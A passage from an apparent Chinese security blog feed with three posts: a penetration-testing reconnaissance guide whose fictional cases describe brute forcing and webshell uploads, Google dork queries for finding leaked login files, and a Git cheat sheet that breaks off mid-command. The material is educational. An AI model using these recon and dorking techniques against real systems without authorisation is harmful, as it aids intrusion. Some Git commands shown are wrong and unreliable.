    <content type="html"><![CDATA[<p>信息收集是渗透测试中第二阶段的工作，也是非常重要的一项。所收集到的情报信息，能直接影响下一阶段的工作及效果。那么具体的信息收集工作应如何实施呢？接下来我会用一此虚构的案例结合原理来进行说明，如有不足之处或有更多更好的信息收集方法或工具，恳请在评论处指正和留下其它信息收集的方法进行技术交流。信息收集是渗透测试中第二阶段的工作，也是非常重要的一项。所收集到的情报信息，能直接影响下一阶段的工作及效果。那么具体的信息收集工作应如何实施呢？</p><a id="more"></a><p>正所谓“知己知彼，百战百胜”，信息收集就像一场战争中的“深入敌后”的一项“情报收集”任务。在开始渗透测试工作之前，我们通过要对目标使用各种工具进行信息收集工作，找出目标的漏洞和弱点，然后利用这些漏洞和弱点进行攻击，使得渗透任务得以顺利地完成。在战争中假如你的情报收集工作出错重大错误，战士们牺牲的就是性命，由此可见，情报收集工作的重要性。任何工作、任何任务都是有一定方法去进行实施的，信息收集工作也一样。在进行这项工作之前，我先对一些信息收集的方法信息收集的方法、区别及作用进行简单的介绍：</p><h2 id="信息收集方法、区别及作用"><a href="#信息收集方法、区别及作用" class="headerlink" title="信息收集方法、区别及作用"></a>信息收集方法、区别及作用</h2><p>(1) 主动收集：相当于通过技术手段去侦察目标的情况，此时目标有可能记录下此次事件的信息。例如：我晚上偷偷摸摸地去小明家里，去查看他家用的是什么品牌保险柜？然后记录下收集到的信息。对于这种情况小明家里可能会有摄像头记录下我的行为。</p><p>(2) 被动收集：相当于通过技术手段去收集目标遗留的信息，此时目标并不能感知事件的发生。例如：小明在某个论坛中留下了自己的生日、年龄、学号等信息，根据收集到的信息生成字典，对小明的保险箱进行密码破解。对于这种情况小明又怎么可能发现我在收集他的信息呢。</p><h2 id="信息收集的具体实施方法"><a href="#信息收集的具体实施方法" class="headerlink" title="信息收集的具体实施方法"></a>信息收集的具体实施方法</h2><h4 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h4><p>子域名枚举/在线子域名枚举扫描：主要是通过工具中的字典，对字典中的二级域名进行轮询查询，从而得出结果，收集到的数据准确性高，但是疏漏洞率也相对较高。</p><p>域传送漏洞：对目标所在的DNS服务器进行漏洞利用，能获取目标所在DNS服务器中的记录，属于很老的漏洞，对于特定的目标几乎很难能找到该漏洞的存在，但在工作中何妨不尝试一下呢？</p><p>DNS数据集平台：基于全网信息持续收集的平台，根据其收录的信息，以快速查找到需要的数据。</p><pre><code>(1) DNSdumpster：https://dnsdumpster.com/ (2) VirusTotal：https://www.virustotal.com/#/home/search </code></pre><p>另外还有，站长工作和搜索引擎所收录到信息进行查找，在此不作详细介绍。</p><p><strong>案例：通过子域名枚举工具，对目标网站进行子域名收集收集，发现一处名为admin.xxx.com的管理后台，并尝试进行弱口令暴力破解攻击成功。进入后台后，发现高危漏洞，getshell成功。 </strong></p><p>####防火墙(waf)识别<br>防火墙识别的原理主要是通过请求中的状态码返回的响应头容、正文内容，进行匹配和判断的。其实跟CMS指纹识别有点类似，只是相对来说规则比较简单，当然也有识别不了的情况，那你就要增加相应的检测规则了。</p><p>当我们在做渗透测试的时候，如果遇到防火墙的话，就通过不断地尝试去绕过他的防火墙规则(黑名单)，或者通过某些方法获得防火墙的源码，去审计规则从而进行绕过；或者根据以前的绕过经验对目标防火墙进行绕过，这个绕过工作需要要足够的时间和耐心才能够完成。    </p><h4 id="端口服务收集"><a href="#端口服务收集" class="headerlink" title="端口服务收集"></a>端口服务收集</h4><p>Nmap是安全相关专业人员使用广泛的安全扫描使用之一，它可以检测目标主机是否在线、端口开放情况、侦测运行的服务类型及版本信息、侦测操作系统与设备类型等信息，甚至还能对主机进行漏洞扫描。</p><p>Nmap的端口服务识别的原理是，通过网络发送请求包到服务器中，利用网络的通信请求建立的握手过程(多种方式)进行服务的状态进行判断，服务版本识别主要是通过发送特定的数据包到目标的端口服务中，通过返回的信息进行识别，例如3306(mysql服务)，nmap通过mysql的网络协议通信过程，与mysql建立连接，mysql返回Handshake packet数据包，其中该包中包含mysql版本号信息，nmap从中获取mysql的具体版本信息。</p><p>由于Nmap所提供的功能和选项及使用思路较多，在此不再作详细介绍，有兴趣的同学请利用搜索引擎搜索相关的知识。</p><p><strong>案例：对某企业进行渗透测试时，发现企业服务器中开放了6379(redis中间件服务)，根据以前的经验，redis服务可能存在未授权访问漏洞，能直接获得服务器权限，从而getshell成功。</strong></p><h4 id="C段IP信息收集"><a href="#C段IP信息收集" class="headerlink" title="C段IP信息收集"></a>C段IP信息收集</h4><p>这里的C段指的是并非网络中的C类地址，而是C类地址中子网掩码为255.255.255.0/24中的IP地址段，共254个。对于某些中大型厂商通过有可能使用的是自建的托管机房，他们的业务通常部署在同一个C类地址子网中，这就给了我们可以利用的空间了。</p><p>就好像我们家里的路由器一样，当我破解了一个邻居的wifi密码后，接收他的网络，这个时候我就能使用监听工具，对他所发出/接收的数据进行拦截监听，从中获取得相关的账号、密码及信息，当然也有其它的方法和思路可以获取目标服务器的数据或权限。例如：C段中的业务系统与目标服务器的业务系统有关联，使用的是同一个数据库，那么就有可能直接获取到目标服务器的信息了。</p><p>能够查询C段的工具有很多，在此不一一介绍，我最常用的还是nmap。假如我们能够查询到目标网络的C段IP都是开放的。这时候我们就得找一此比较薄弱的IP来重新进行信息收集工作了。</p><p><strong>案例：在渗透测试测试中，未能在目标服务器寻找到高危漏洞，然后将思路转变到子网中的其它服务器中，此时我们在获得权限的子网。</strong></p><h4 id="旁站信息收集"><a href="#旁站信息收集" class="headerlink" title="旁站信息收集"></a>旁站信息收集</h4><p>旁站指的是，不同的web站点部署在同一台服务器中，在渗透测试的时候，如果目标服务器难以寻找突破点，我们也可以通过旁站入手，寻找弱点，然后再想办法对目标服务器进行跨攻击。例如：通过系统提限、跨目录权限、mysql权限，对目标服务器实施攻击。</p><p>旁站查询主要是通过各大站长平台，基于对以前的收录信息，通过IP进行分组划分，查找其目标的IP来查询相同IP的解释记录而得出的结果，主要的工具有：</p><pre><code>http://dns.aizhan.comhttp://s.tool.chinaz.com/samehttp://i.links.cn/sameip/http://www.ip2hosts.com/</code></pre><p><strong>案例：在渗透测试工作中，由于未找到目标服务器中的漏洞，继而将思路转变到从旁站入手，先是获到旁站的权限，再是由于系统管理员未对不同的web文件夹权限进行用户权限控制，导致旁站能跨目录写入一句话木马到目标的web文件夹，成功getshell并获取目标服务器的mysql账号及密码。</strong></p><h4 id="敏感目录-文件收集"><a href="#敏感目录-文件收集" class="headerlink" title="敏感目录/文件收集"></a>敏感目录/文件收集</h4><p>该信息收集方法利用的是基本广大的安全行业从业者对常见web的敏感危险目录/文件形成一个汇总字典，当然也可以结合自己的经验，将文件加入到字典中，增加字典的范围，然后利用该字典向目标web服务器发出请求，显示返回的状态码，然后我们根据状态码进行人工进行判断分析有没有敏感文件可以进行利用。</p><p>响应码判断：如200代表请求成功。403|401代表无权限，但文件/目录是存在的，500代表服务器出错。其它的响应有状态码请同学们到搜索引擎进行搜索相关知识。</p><p>收集敏感目录/文件的主要工具有：DirBuster、御剑后台等。本人觉得下面图示的工具不太好用。 </p><h4 id="IIS短文件名枚举"><a href="#IIS短文件名枚举" class="headerlink" title="IIS短文件名枚举"></a>IIS短文件名枚举</h4><p>此漏洞利用了windows为了对16位MS-DOS程序兼容处理功能来收集信息的。windows为文件名较长的文件（和文件夹）生成了对应的windows 8.3 短文件名，导致攻击者可利用xxx~1字符实施获取长文件名/目录名的信息。当对方的服务器为IIS，不妨可以尝试一下这个漏洞。</p><p><strong>案例：文件名为xxx_login.php的时候，xxx为有特定含义的字符，由于我们所使用的敏感目录/文件收集工具中没有该文件名的字典，所以未能找出该登录后台的地址。此时我们就可以使用IIS短文件名枚举漏洞进行信息收集，得出的结果为xxx_lo~1.php，此时我们就能猜测到这很可能是一个登录页面了。</strong></p><h4 id="GitHub信息收集"><a href="#GitHub信息收集" class="headerlink" title="GitHub信息收集"></a>GitHub信息收集</h4><p>GitHub是通过Git进行版本控制的软件源代码托管服务平台，当一个项目需要进行协同开发时，就得使用svn或github对代码进行托管及版本控制了。</p><p>GitHub不仅仅是商用的平台，也可以通过该平台对代码进行公开分享并且能获得Star来证明此代码是优秀的。由于此功能的存在，就有可能有部分开发工程师，或者由于公司对代码的管理制度不严谨，造成内部代码公开处理，令攻击者有机可乘。</p><p><strong>案例：某某网站，有部分项目的源代码在github上进行了公开处理，其中，代码中包含敏感的xxx信息，造成重要的信息泄露。</strong><br><code>GitHub信息收集工具：https://github.com/MiSecurity/x-patrol</code></p><h4 id="网站资产信息探测"><a href="#网站资产信息探测" class="headerlink" title="网站资产信息探测"></a>网站资产信息探测</h4><p>资产信息，这里指的是服务器用的是什么操作系统、中间件、脚本语言、数据库、CMS等等的信息。那么收集到这些信息之后有什么作用呢？比如说目标服务器用的是php语言开发的网站，那么我们就得利用php的一些漏洞去进行渗透了，比如说php的弱类型漏洞等等。如果目标服务器用的是某个cms的源码开发的网站，那么我们就得去查找该cms曾经暴出来的漏洞去进行利用了。</p><p>在这里主要介绍一下CMS指纹识别的原理：是通过请求检查特定的URL或文件是否存在，这个就像sfz的开头的省市都是有特定意义的，每个CMS系统中都存在与众不同的文件或其它信息，这些信息也是由大量前辈汇总而成的，有一些工具只能检测到部分的CMS，因为他们收集的识别信息太少了，CMS指纹识别就是通过这种方式进行检测的。</p><p>以下是我日常中使用到的工具及收集方法：</p><pre><code>(1)  云悉：http://www.yunsee.cn/info.html(2)  查看数据包响应头(3)  CMS指纹识别：http://whatweb.bugscaner.com/look/ </code></pre><p>**案例：在某次的渗透测试工作中，先是对网站进行资产信息探测试，发现目标网站使了</p><p>某个开源的CMS系统，然后通过默认的CMS后台管理地址和默认密码进入后台，再利用该CMS的后台高危漏洞，成功上传一句话木马，成功getshell。**</p><h4 id="shodan、fofa、钟馗之眼信息收集"><a href="#shodan、fofa、钟馗之眼信息收集" class="headerlink" title="shodan、fofa、钟馗之眼信息收集"></a>shodan、fofa、钟馗之眼信息收集</h4><p>shodan、fofa、钟馗之眼，他们所提供的功能同样都类似于搜索引擎，都是通过特定的语法去进行信息收集，但与搜索不同的是，web、可见的页面信息进行爬取收录，而他们则是对全网的在线网络设备进行搜索加入其数据库中，例如：各类服务器，数据库，某个系统的端口信息，并提供POC等信息。</p><p>那么我们应该如何使用上述这几个工具呢？对于无指定目标的渗透测试，我们可以将他们当成是一个高级漏洞扫描器来使用，利用他们来获取大量有已知漏洞的主机来进行渗透测试。对于指定目标的渗透测试，我们也可以利用他来做信息收集，此时也需要一定的运气成分，因为他们都是基于全网的搜索，并不一定能够保证收集到网络上的所有机器。</p><p><strong>案例：在某次渗透测试任务中，使用钟馗之眼对目标服务器进行信息收集，发现高危漏洞，并且利用成功，getshell成功。</strong></p><h4 id="寻找真实IP"><a href="#寻找真实IP" class="headerlink" title="寻找真实IP"></a>寻找真实IP</h4><p>为什么要寻找真实IP?，当某个企业使用了CDN/云防线/反向代理等方式对服务进行架构设计时，我们通过ping命令等并不能直接将请求传递到真实的服务器上，而是经过一层设置对该请求进行转向，导致到我们不能获取到真实服务器的开放端口等信息进行收集。</p><p>那么，当我们遇到上述的情况时，我们应该如何才能获取到目标的真实IP呢？下面由我来简述一些比较有趣的方法：</p><p>从子域名入手，一个企业的业务种类繁多，可能只有部分主营业务，访问压力大的域名才使用了CDN，子域名的业务有可能部署在同一台服务器中，或部署在同一个C段中，所以我们就有可能从中找到真实的IP地址。</p><p>历史的DNS平台：<a href="https://dnsdb.io/zh-cn/|" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/|</a> <a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a><br>通过平台以前收集到的ip与域名绑定历史记录进行查询。 </p><p>邮件原文：通过网站提供的邮件发送功能，如注册时的邮箱验证等，将邮件发送至自己的邮箱中，再查看其邮件原文内容，邮件原文中存在的IP地址有可能就是其真实的IP。</p><p>其它方法在此不一一介绍，有兴趣的同学到搜索引擎去搜索相关的资料吧。</p><p>HTTPS证书查询：工具<a href="https://censys.io/，" target="_blank" rel="noopener">https://censys.io/，</a><br>该工具也是能过全网收集站点的https证书及ip地址，也可以利用该工具进行查找。</p><p><strong>案例：某个企业网站使用了CDN服务，无法对其真正的服务器进行Nessus进行弱点扫描分析，然后通过phpinfo.php的信息泄露漏洞获取到真实的IP地址，然后对其真实的服务器进行弱点扫描分析，发现高危漏洞，并且成功getshell。</strong></p><h4 id="搜索引擎语法"><a href="#搜索引擎语法" class="headerlink" title="搜索引擎语法"></a>搜索引擎语法</h4><p>主要是利用搜索引擎所收录的数据，通过特定的语法进行搜索，可以达到迅速发现目标弱点的效果。</p><p>利用该方法需要一定的经验积累，以下是针定特定目标的信息收集思路。例如：对于不同的业务系统，得想出不同的联想词，例如商城系统，联想词可以为商家系统，对于大型的企业，OA登录、CRM等等的联想词。</p><pre><code>后台：site:xxx.xxx admin|login|system|管理|登录|内部|系统钓鱼：site:xxx.xxx 邮件|email社工：site:xxx.xxx qq|群|微信|腾讯越权：site:xxx.xxx inurl:uid=1|userid=1包含：site:xxx.xxx inurl:php?include=</code></pre><p>还有其它很多很多的方法，在此不在一一列举，有兴趣的同学请找相关的资料来学习。总结一下，对于特定的目标利用该方法去做信息收集，效果并不会特别理想，但对于无指定目标的渗透，将会给我们的渗透工作带来极大的便利，能辅助我们快速找到目标的弱点，进行渗透。</p><p><strong>案例：在某次渗透测试工作中，已经对目标进行子域名收集工作，但未能通过收集到的子域名渗透成功，然后通过利用搜索引擎语法（site:xxx.xxx系统）进行搜索，发一个xxx.xxx/staff/login.html的页面，该页面为员工系统登录页面，接下来使用弱口令进行暴力破解登录成功。 </strong></p><h4 id="爬虫分析"><a href="#爬虫分析" class="headerlink" title="爬虫分析"></a>爬虫分析</h4><p>爬虫分析，是要把整个网站的网页及目录信息结构爬取出来，通过爬取出来的结果去猜测开发工程师的开发思维及逻辑，从中得到某些信息进而利用。</p><p><strong>案例1：通过某个后台，此时已通过某个漏洞进入后台，此时使用爬虫整个后台进行爬虫，其中发现ad/add.php(广告增加)|ad/edit.php(广告编辑)|user/add.php(增加用户)|user/list(会员列表)等等。从中得知开发工程师使用的是有规律、有规范的页面链接命名，那么根据经验，有可能存在admin/add.php等等的页面，有可能存在越权操作漏洞，进而利用。</strong></p><p><strong>案例2：通过爬虫发现，在使用敏感目录/文件进行信息收集时，未发现有危险和可利用的重要信息，但通过爬虫发现了某个重要的后台链接地址，一般来说，开发工程师对于后台的防护较为薄弱，像此类信息也有可能在渗透测试中利用，也需要记录下来。</strong></p><h4 id="AWVS-web弱点扫描"><a href="#AWVS-web弱点扫描" class="headerlink" title="AWVS web弱点扫描"></a>AWVS web弱点扫描</h4><p>Acunetix Web Vulnerability Scanner（简称AWVS）是一款知名的网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞，如交叉站点脚本,sql 注入等。在被黑客攻击前扫描购物车，表格、安全区域和其他Web应用程序。75% 的互联网攻击目标是基于Web的应用程序。因为他们时常接触机密数据并且被放置在防火墙之前。</p><p>AWVS如上述所示，主要是通过爬虫来测试你的网站安全，来进行安全漏洞检测，操作及使用方法也相对简单，在此不详细介绍。</p><p>AWVS能检测出的漏洞种类繁多，当然也有可能出现误报的现象，这时就需要我们根据AWVS检测来做难，才能确定漏洞是否存在了。</p><p>AWVS能检测出的漏洞确实很多，我们在短期内也很难完全各种漏洞及原理。不过AWVS官网有一个所有漏洞的列表。同学们可以根据列表的内容去学习自己想要知道的漏洞原理。漏洞列表链接为：    <a href="https://www.acunetix.com/vulnerabilities/" target="_blank" rel="noopener">https://www.acunetix.com/vulnerabilities/</a></p><h4 id="Nessus-主机弱点扫描"><a href="#Nessus-主机弱点扫描" class="headerlink" title="Nessus 主机弱点扫描"></a>Nessus 主机弱点扫描</h4><p>Nessus 是目前全世界最多人使用的系统漏洞扫描与分析软件。总共有超过75,000个机构使用Nessus 作为扫描该机构电脑系统的软件。，</p><p>Nessus，系统扫描与分析软件，主要针对的是操作系统及操作系统所安装的软件进行漏洞分析，当然也有很多其它附带的功能，例如:web漏洞安全漏洞检测、简单的信息收集。正所谓，专业的人做专业的事，Nessus针对的是操作系统及操作系统所安装的软件进行漏洞分析，因此我们主要的关注点应该在主机漏洞的严重|高|中级别的漏洞，当然Nessus也有误报的情况，这时也需要我们根据其漏洞的编号、信息去进行难。</p><h4 id="whois信息收集、员工信息、公司名、社工库、云盘搜索"><a href="#whois信息收集、员工信息、公司名、社工库、云盘搜索" class="headerlink" title="whois信息收集、员工信息、公司名、社工库、云盘搜索"></a>whois信息收集、员工信息、公司名、社工库、云盘搜索</h4><p>为什么要将上述几种需要收集的信息放在一起呢？主要是因为以前几种方法针对的通过社工的方法去对目标进行渗透测试。特别需要强调的是云盘搜索，云盘搜索利用原理的是由于企业的管理不善，可能上传了部分的敏感信息资料到云盘中以方便其他员工对需要的资料进行下载，因此我们有可能在这部分的资料中找到一些敏感的信息，从而进行攻击。</p><p><strong>案例：通过信息收集所收集的信息，发展了某个企业的员工系统登录入口，账号为员工的编号，此时我们尚未得知该企业的员工编号规则，然后我们继续通过其它的信息收录方式进行收集，在云盘中发现了该企业曾经上传过一份企业员工基本信息的资料，遂将其下载，并结合自己的所使用的密码字典进行暴力破解，最终成功登录到后台中。</strong></p><h2 id="信息收集总结"><a href="#信息收集总结" class="headerlink" title="信息收集总结"></a>信息收集总结</h2><p>在渗透测试中，信息收集是比较枯燥乏味的一项工作任务，但也是一项很重要的工作，所收集的信息能直接影响到下一步的渗透思路及效果，所以一定要有耐心和准备好持续长期地完成这一项工作任务。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;信息收集是渗透测试中第二阶段的工作，也是非常重要的一项。所收集到的情报信息，能直接影响下一阶段的工作及效果。那么具体的信息收集工作应如何实施呢？接下来我会用一此虚构的案例结合原理来进行说明，如有不足之处或有更多更好的信息收集方法或工具，恳请在评论处指正和留下其它信息收集的方法进行技术交流。信息收集是渗透测试中第二阶段的工作，也是非常重要的一项。所收集到的情报信息，能直接影响下一阶段的工作及效果。那么具体的信息收集工作应如何实施呢？&lt;/p&gt;
    
    </summary>
    
    
      <category term="工具" scheme="http://austfish.cn/tags/%E5%B7%A5%E5%85%B7/"/>
    
      <category term="安全" scheme="http://austfish.cn/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>如何挖信息泄密漏洞</title>
    <link href="http://austfish.cn/2019/10/10/%E5%A6%82%E4%BD%95%E6%8C%96%E4%BF%A1%E6%81%AF%E6%B3%84%E5%AF%86%E6%BC%8F%E6%B4%9E/"/>
    <id>http://austfish.cn/2019/10/10/如何挖信息泄密漏洞/</id>
    <published>2019-10-10T08:43:41.000Z</published>
    <updated>2022-02-18T03:34:21.841Z</updated>
    
    <content type="html"><![CDATA[<p>1.随缘找信息泄密<br>2.如何构造语法<br>3.指定站点的Google hacking语法<br><a id="more"></a></p><h1 id="正确姿势如下"><a href="#正确姿势如下" class="headerlink" title="正确姿势如下"></a>正确姿势如下</h1><h3 id="1-随缘找信息泄密"><a href="#1-随缘找信息泄密" class="headerlink" title="1.随缘找信息泄密"></a>1.随缘找信息泄密</h3><p>直接用Google hacking语法</p><p>语法如下：<br><strong><br>filetype:txt 登录<br>filetype:xls 登录<br>filetype:doc 登录</strong></p><p>这三条是我经常用的Google hacking语法<br>（后面的”登录”可以替换自己构造的语法，文件类型也是可以的）<br><img src="http://qiniu.austfish.cn/blog/20191010/E0k0kysmFxOl.jpg?imageslim" alt="mark"></p><h3 id="2-如何构造语法"><a href="#2-如何构造语法" class="headerlink" title="2.如何构造语法"></a>2.如何构造语法</h3><blockquote><p>filetype:文件类型 文件内包含的内容</p></blockquote><h3 id="3-指定站点的Google-hacking语法"><a href="#3-指定站点的Google-hacking语法" class="headerlink" title="3.指定站点的Google hacking语法"></a>3.指定站点的Google hacking语法</h3><p>指定站点其实也很简单，就直接在上面的语法前面加个</p><blockquote><p>site:xxx.com</p></blockquote><p><img src="http://qiniu.austfish.cn/blog/20191010/I9qsa9TqRo3G.jpg?imageslim" alt="mark"></p><blockquote><p>site:baidu.com filetype:txt 登录账号</p></blockquote><p>上面那条语法的意思是搜索baidu.com这个域名（包括子域）的txt文件并且文件内容里包含了登录账号这些关键词，可以针对目标站点进行改动。</p><h1 id="eg"><a href="#eg" class="headerlink" title="eg:"></a>eg:</h1><p><img src="http://qiniu.austfish.cn/blog/20191010/s6A7mbyW60id.png?imageslim" alt="mark"><br><img src="http://qiniu.austfish.cn/blog/20191010/Ofyfpm3kOedP.jpg?imageslim" alt="mark"><br><img src="http://qiniu.austfish.cn/blog/20191010/N91FTIWY0ONx.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;1.随缘找信息泄密&lt;br&gt;2.如何构造语法&lt;br&gt;3.指定站点的Google hacking语法&lt;br&gt;
    
    </summary>
    
    
      <category term="工具" scheme="http://austfish.cn/tags/%E5%B7%A5%E5%85%B7/"/>
    
      <category term="安全" scheme="http://austfish.cn/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="挖洞" scheme="http://austfish.cn/tags/%E6%8C%96%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>Git常用操作指南</title>
    <link href="http://austfish.cn/2019/10/10/Git%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/"/>
    <id>http://austfish.cn/2019/10/10/Git常用操作指南/</id>
    <published>2019-10-10T03:28:29.000Z</published>
    <updated>2022-02-18T03:34:20.390Z</updated>
    
    <content type="html"><![CDATA[<p>Git常用命令<br>团队协作git操作流程<br>git工作流<br>Git命令大全<br><a id="more"></a></p><h1 id="git常用命令："><a href="#git常用命令：" class="headerlink" title="git常用命令："></a>git常用命令：</h1><pre><code>git init //初始化本地git环境git clone XXX//克隆一份代码到本地仓库git pull //把远程库的代码更新到工作台git pull --rebase origin master //强制把远程库的代码跟新到当前分支上面git fetch //把远程库的代码更新到本地库git add . //把本地的修改加到stage中git commit -m &apos;comments here&apos; //把stage中的修改提交到本地库git push //把本地库的修改提交到远程库中git branch -r/-a //查看远程分支/全部分支git checkout master/branch //切换到某个分支git checkout -b test //新建test分支git checkout -d test //删除test分支git merge master //假设当前在test分支上面，把master分支上的修改同步到test分支上git merge tool //调用merge工具git stash //把未完成的修改缓存到栈容器中git stash list //查看所有的缓存git stash pop //恢复本地分支到缓存状态git blame someFile //查看某个文件的每一行的修改记录（）谁在什么时候修改的）git status //查看当前分支有哪些修改git log //查看当前分支上面的日志信息git diff //查看当前没有add的内容git diff --cache //查看已经add但是没有commit的内容git diff HEAD //上面两个内容的合并git reset --hard HEAD //撤销本地修改echo $HOME //查看git config的HOME路径export $HOME=/c/gitconfig //配置git config的HOME路径</code></pre><h1 id="团队协作git操作流程："><a href="#团队协作git操作流程：" class="headerlink" title="团队协作git操作流程："></a>团队协作git操作流程：</h1><h5 id="克隆一个全新的项目，完成新功能并且提交："><a href="#克隆一个全新的项目，完成新功能并且提交：" class="headerlink" title="克隆一个全新的项目，完成新功能并且提交："></a>克隆一个全新的项目，完成新功能并且提交：</h5><pre><code>git clone XXX //克隆代码库git checkout -b test //新建分支modify some files //完成修改git add . //把修改加入stage中git commit -m &apos;&apos; //提交修改到test分支review代码git checkout master //切换到master分支git pull //更新代码git checkout test //切换到test分支git meger master //把master分支的代码merge到test分支git push origin 分支名//把test分支的代码push到远程库</code></pre><h5 id="目前正在test分支上面开发某个功能，但是没有完成。突然一个紧急的bug需要处理"><a href="#目前正在test分支上面开发某个功能，但是没有完成。突然一个紧急的bug需要处理" class="headerlink" title="目前正在test分支上面开发某个功能，但是没有完成。突然一个紧急的bug需要处理"></a>目前正在test分支上面开发某个功能，但是没有完成。突然一个紧急的bug需要处理</h5><pre><code>git add .git stashgit checkout bugFixBranchgit pull --rebase origin masterfix the buggit add .git commit -m &apos;&apos;git pushgit checkout testgit stash popcontinue new feature&apos;s development</code></pre><h1 id="git工作流"><a href="#git工作流" class="headerlink" title="git工作流"></a>git工作流</h1><p><img src="http://qiniu.austfish.cn/blog/20191010/4IClDAVOHhmv.png?imageslim" alt="mark"></p><h1 id="Git命令大全"><a href="#Git命令大全" class="headerlink" title="Git命令大全"></a>Git命令大全</h1><h5 id="查看、添加、提交、删除、找回，重置修改文件"><a href="#查看、添加、提交、删除、找回，重置修改文件" class="headerlink" title="查看、添加、提交、删除、找回，重置修改文件"></a>查看、添加、提交、删除、找回，重置修改文件</h5><pre><code>git help &lt;command&gt; # 显示command的helpgit show # 显示某次提交的内容 git show $idgit co -- &lt;file&gt; # 抛弃工作区修改git co . # 抛弃工作区修改git add &lt;file&gt; # 将工作文件修改提交到本地暂存区git add . # 将所有修改过的工作文件提交暂存区git rm &lt;file&gt; # 从版本库中删除文件git rm &lt;file&gt; --cached # 从版本库中删除文件，但不删除文件git reset &lt;file&gt; # 从暂存区恢复到工作文件git reset -- . # 从暂存区恢复到工作文件git reset --hard # 恢复最近一次提交过的状态，即放弃上次提交后的所有本次修改git ci &lt;file&gt; git ci . git ci -a # 将git add, git rm和git ci等操作都合并在一起做　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　git ci -am &quot;some comments&quot;git ci --amend # 修改最后一次提交记录git revert &lt;$id&gt; # 恢复某次提交的状态，恢复动作本身也创建次提交对象git revert HEAD # 恢复最后一次提交的状态</code></pre><h5 id="查看文件diff"><a href="#查看文件diff" class="headerlink" title="查看文件diff"></a>查看文件diff</h5><pre><code>git diff &lt;file&gt; # 比较当前文件和暂存区文件差异 git diffgit diff &lt;id1&gt;&lt;id1&gt;&lt;id2&gt; # 比较两次提交之间的差异git diff &lt;branch1&gt;..&lt;branch2&gt; # 在两个分支之间比较git diff --staged # 比较暂存区和版本库差异git diff --cached # 比较暂存区和版本库差异git diff --stat # 仅仅比较统计信息</code></pre><h5 id="查看提交记录"><a href="#查看提交记录" class="headerlink" title="查看提交记录"></a>查看提交记录</h5><pre><code>git log git log &lt;file&gt; # 查看该文件每次提交记录git log -p &lt;file&gt; # 查看每次详细修改内容的diffgit log -p -2 # 查看最近两次详细修改内容的diffgit log --stat #查看提交统计信息</code></pre><h5 id="tigtig"><a href="#tigtig" class="headerlink" title="tigtig"></a>tigtig</h5><pre><code>Mac上可以使用tig代替diff和log，brew install tig</code></pre><h2 id="Git-本地分支管理"><a href="#Git-本地分支管理" class="headerlink" title="Git 本地分支管理"></a>Git 本地分支管理</h2><h5 id="查看、切换、创建和删除分支"><a href="#查看、切换、创建和删除分支" class="headerlink" title="查看、切换、创建和删除分支"></a>查看、切换、创建和删除分支</h5><pre><code>git br -r # 查看远程分支git br &lt;new_branch&gt; # 创建新的分支git br -v # 查看各个分支最后提交信息git br --merged # 查看已经被合并到当前分支的分支git br --no-merged # 查看尚未被合并到当前分支的分支git co &lt;branch&gt; # 切换到某个分支git co -b &lt;new_branch&gt; # 创建新的分支，并且切换过去git co -b &lt;new_branch&gt; &lt;branch&gt; # 基于branch创建新的new_branchgit co $id # 把某次历史提交记录checkout出来，但无分支信息，切换到其他分支会自动删除git co $id -b &lt;new_branch&gt; # 把某次历史提交记录checkout出来，创建成一个分支git br -d &lt;branch&gt; # 删除某个分支git br -D &lt;branch&gt; # 强制删除某个分支 (未被合并的分支被删除的时候需要强制)</code></pre><h5 id="分支合并和rebase"><a href="#分支合并和rebase" class="headerlink" title="分支合并和rebase"></a>分支合并和rebase</h5><pre><code>git merge &lt;branch&gt; # 将branch分支合并到当前分支git merge origin/master --no-ff # 不要Fast-Foward合并，这样可以生成merge提交git rebase master &lt;branch&gt; # 将master rebase到branch，相当于： git co &lt;branch&gt; &amp;&amp; git rebase master &amp;&amp; git co master &amp;&amp; git merge &lt;branch&gt;</code></pre><h2 id="Git补丁管理-方便在多台机器上开发同步时用"><a href="#Git补丁管理-方便在多台机器上开发同步时用" class="headerlink" title="Git补丁管理(方便在多台机器上开发同步时用)"></a>Git补丁管理(方便在多台机器上开发同步时用)</h2><pre><code>git diff &gt; ../sync.patch # 生成补丁git apply ../sync.patch # 打补丁git apply --check ../sync.patch #测试补丁能否成功</code></pre><h2 id="Git暂存管理"><a href="#Git暂存管理" class="headerlink" title="Git暂存管理"></a>Git暂存管理</h2><pre><code>git stash # 暂存git stash list # 列所有stashgit stash apply # 恢复暂存的内容git stash drop # 删除暂存区</code></pre><h2 id="Git远程分支管理"><a href="#Git远程分支管理" class="headerlink" title="Git远程分支管理"></a>Git远程分支管理</h2><pre><code>git pull # 抓取远程仓库所有分支更新并合并到本地git pull --no-ff # 抓取远程仓库所有分支更新并合并到本地，不要快进合并git fetch origin # 抓取远程仓库更新git merge origin/master # 将远程主分支合并到本地当前分支git co --track origin/branch # 跟踪某个远程分支创建相应的本地分支git co -b &lt;local_branch&gt; origin/&lt;remote_branch&gt; # 基于远程分支创建本地分支，功能同上git push # push所有分支git push origin master # 将本地主分支推到远程主分支git push -u origin master # 将本地主分支推到远程(如无远程主分支则创建，用于初始化远程仓库)git push origin &lt;local_branch&gt; # 创建远程分支， origin是远程仓库名git push origin &lt;local_branch&gt;:&lt;remote_branch&gt; # 创建远程分支git push origin :&lt;remote_branch&gt; #先删除本地分支(git br -d &lt;branch&gt;)，然后再push删除远程分支</code></pre><h2 id="Git远程仓库管理"><a href="#Git远程仓库管理" class="headerlink" title="Git远程仓库管理"></a>Git远程仓库管理</h2><h5 id="GitHub"><a href="#GitHub" class="headerlink" title="GitHub"></a>GitHub</h5><pre><code>git remote -v # 查看远程服务器地址和仓库名称git remote show origin # 查看远程服务器仓库状态git remote add origin git@ github:robbin/robbin_site.git # 添加远程仓库地址git remote set-url origin git@ github.com:robbin/robbin_site.git # 